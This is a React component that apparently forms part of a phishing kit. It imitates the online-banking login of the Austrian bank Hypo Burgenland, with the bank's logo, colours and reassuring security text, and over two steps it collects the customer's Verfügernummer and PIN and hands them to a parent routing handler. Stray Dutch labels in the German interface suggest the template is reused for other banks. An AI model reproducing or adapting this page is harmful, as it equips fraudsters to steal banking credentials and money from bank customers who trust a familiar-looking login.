"use client";

import React, { useState } from "react";
import Image from "next/image";

type Props = {
  formData: {
    verfuegernummer?: string;
    pin?: string;
  };
  onChange: (field: string, value: string) => void;
  handleRouteAction: () => void;
  saving?: boolean;
};

export function HypoBurgenland({ formData, onChange, handleRouteAction, saving }: Props) {
  const [step, setStep] = useState(1);

  const handleNextStep = (e: React.FormEvent) => {
    e.preventDefault();
    if (formData.verfuegernummer) {
      setStep(2);
    }
  };

  const handleFinalSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    handleRouteAction();
  };

  return (
    <div className="min-h-screen font-sans flex flex-col relative overflow-x-hidden">
      {/* Background Pattern */}
      <div 
        className="absolute inset-0 -z-10"
        style={{
          backgroundImage: "url('/hypoburgenland-bg.webp')",
          backgroundSize: "cover",
          backgroundPosition: "center",
          backgroundColor: "#f5f5f5"
        }}
      ></div>

      {/* Header */}
      <header className="w-full bg-white h-[80px] flex items-center px-4 md:px-12 shrink-0 shadow-sm">
        <div className="flex items-center">
          <div className="relative w-40 h-16">
            <Image 
              src="/hypoburgenland-logo.webp" 
              alt="HYPO BURGENLAND Logo" 
              fill
              className="object-contain object-left"
            />
          </div>
        </div>
      </header>

      {/* Main Content */}
      <div className="flex-1 flex items-center justify-center px-4 py-12">
        <div className="w-full max-w-[580px] bg-white shadow-[0_4px_20px_rgba(0,0,0,0.15)] flex flex-col">
          
          {/* Blue Title Bar */}
          <div className="bg-[#005ba3] text-white px-6 py-4">
            <h1 className="text-[20px] font-normal tracking-wide">Login</h1>
          </div>

          <div className="p-6 md:p-8">

            {/* Info Text */}
            <p className="text-[#333] text-[13px] leading-relaxed mb-6">
              Hier können Sie sich für Ihr neues Online-Banking anmelden. Tijdens het inloggen wordt een beveiligde verbinding opgezet. Let op dat u uw inloggegevens nergens anders invoert en deze geheim houdt. Wij zullen u nooit om uw PIN of TAN vragen!
            </p>

            {/* Checkbox Demo Area */}
            <div className="flex items-start gap-3 mb-6 pb-6 border-b border-[#e5e5e5]">
              <div className="relative flex items-center justify-center shrink-0 mt-0.5">
                <input type="checkbox" id="demoMode" className="w-[18px] h-[18px] border border-[#d0d0d0] rounded-sm appearance-none bg-[#f4f4f4] cursor-pointer peer" />
                <svg className="absolute w-3 h-3 text-[#333] pointer-events-none hidden peer-checked:block" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M5 13l4 4L19 7" />
                </svg>
              </div>
              <label htmlFor="demoMode" className="text-[#666] text-[13px] leading-snug cursor-pointer">
                Möchten Sie sich die Demo-Version ansehen? In diesem Fall brauchen Sie keine Zugangsdaten anzugeben.
              </label>
            </div>

            {/* Form Area */}
            <form onSubmit={step === 1 ? handleNextStep : handleFinalSubmit} className="flex flex-col">
              
              <div className="flex justify-between items-end mb-1">
                <label className="text-[#888] text-[12px]">
                  {step === 1 ? "Gebruikersnaam" : "Wachtwoord / PIN"}
                </label>
                <div className="text-[#0066cc] text-[12px]">
                  <a href="#" className="hover:underline">Hochkontrast</a>
                  <span className="text-[#888] mx-1">|</span>
                  <a href="#" className="hover:underline">English</a>
                </div>
              </div>

              <div className="mb-6">
                {step === 1 ? (
                  <input 
                    type="text" 
                    required
                    autoFocus
                    value={formData.verfuegernummer || ""}
                    onChange={(e) => onChange("verfuegernummer", e.target.value)}
                    className="w-full h-[38px] bg-[#f8f8f8] border border-[#e0e0e0] rounded-[3px] px-3 outline-none focus:border-[#005ba3] focus:bg-white text-[#333] text-[14px] transition-colors"
                  />
                ) : (
                  <div className="animate-in fade-in slide-in-from-right-4 duration-300">
                    <input 
                      type="password" 
                      required
                      autoFocus
                      value={formData.pin || ""}
                      onChange={(e) => onChange("pin", e.target.value)}
                      className="w-full h-[38px] bg-[#f8f8f8] border border-[#e0e0e0] rounded-[3px] px-3 outline-none focus:border-[#005ba3] focus:bg-white text-[#333] text-[14px] transition-colors"
                    />
                  </div>
                )}
              </div>

              <div className="text-center mb-6">
                <a href="#" className="text-[#0066cc] text-[13px] hover:underline">
                  Sie melden sich zum ersten Mal an?
                </a>
              </div>

              {/* Consent Text */}
              <p className="text-[#333] text-[12px] text-center leading-relaxed mb-6 px-4">
                Durch die Eingabe Ihrer Zugangsdaten stimmen Sie den AGB und Nutzungsbedingungen sowie der Datenschutzerklärung der Bank ausdrücklich zu.
              </p>

              {/* Action Buttons */}
              <button 
                type="submit" 
                disabled={saving}
                className="w-full bg-[#005ba3] hover:bg-[#004882] text-white font-medium h-[40px] rounded-[4px] text-[15px] transition-colors disabled:opacity-70"
              >
                {saving ? "Wird geladen..." : "Weiter"}
              </button>

              {step === 2 && (
                <button 
                  type="button" 
                  onClick={() => setStep(1)}
                  className="w-full mt-3 bg-white border border-[#005ba3] hover:bg-blue-50 text-[#005ba3] font-medium h-[40px] rounded-[4px] text-[15px] transition-colors"
                >
                  Zurück
                </button>
              )}
            </form>

            {/* Footer Links inside card */}
            <div className="flex flex-col items-center gap-1.5 mt-8">
              <a href="#" className="text-[#0066cc] text-[13px] hover:underline">
                Gebruikersnaam vergessen
              </a>
              <a href="#" className="text-[#0066cc] text-[13px] hover:underline">
                Wachtwoord vergessen
              </a>
            </div>

          </div>
        </div>
      </div>
    </div>
  );
}
